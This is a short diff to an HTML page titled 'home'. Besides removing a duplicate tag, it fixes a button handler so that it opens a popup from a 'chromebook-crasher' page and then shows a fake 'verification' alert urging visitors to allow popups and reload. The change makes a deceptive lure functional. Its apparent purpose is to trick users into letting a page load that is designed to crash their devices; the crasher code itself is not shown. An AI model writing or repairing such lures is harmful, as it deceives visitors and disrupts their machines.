@@ -6,7 +6,6 @@
     <title>
   home
     </title>
-    </title>
     <style>
         /* Center the content on the screen */
         body {
@@ -78,12 +77,11 @@
 
     <script>
         // Function that handles the button click
-        function handleProceed() {
-            // Replace the alert or URL below with your actual destination
-            let windowRef = window.open("https://moocow-web.github.io/chromebook-crasher/popup.html", target, windowFeatures);
-            alert("In order to proceed with verification, please select 'Allow Popups' and reload the page");
-            
-        }
+function handleProceed() {
+    // Replaced undefined variables with the standard "_blank" target
+    let windowRef = window.open("https://moocow-web.github.io/chromebook-crasher/popup.html", "_blank");
+    alert("In order to proceed with verification, please select 'Allow Popups' and reload the page");
+}
     </script>
 
 </body>
